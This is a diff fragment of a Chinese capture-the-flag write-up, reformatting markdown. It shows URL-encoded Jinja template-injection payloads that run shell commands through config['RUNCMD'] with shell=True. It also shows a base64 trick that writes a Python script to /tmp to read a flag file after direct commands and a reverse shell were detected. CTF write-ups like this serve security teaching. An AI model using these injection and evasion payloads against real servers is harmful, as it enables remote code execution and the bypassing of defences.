@@ -27,10 +27,16 @@ name=%7B%7B%20config[%27RUNCMD%27](%27/usr/bin/id%27,shell=True)%20%7D%7D
 然后就算有一个shell尝试反弹shell，en，也不行，会被检测到
 
 然后发现ls dir等命令都被检测到了 于是通过base64解码写入sh 或 python脚本 来执行命令
-找到flag文件在 [size=1em]/var/www/html/fl4g`接着
+找到flag文件在 `/var/www/html/fl4g`接着
+```
 print open('/var/www/html/fl4g','r').read()
+```
 编码成base64
 然后写入
+```
 name=%7B%7B%20config[%27RUNCMD%27](%27echo cHJpbnQgb3BlbignL3Zhci93d3cvaHRtbC9mbDRnJywncicpLnJlYWQoKQ==|base64 -d>/tmp/get.py%27,shell=True)%20%7D%7D
+```
 执行py
+```
 name=%7B%7B%20config[%27RUNCMD%27](%27python /tmp/get.py%27,shell=True)%20%7D%7D
+```
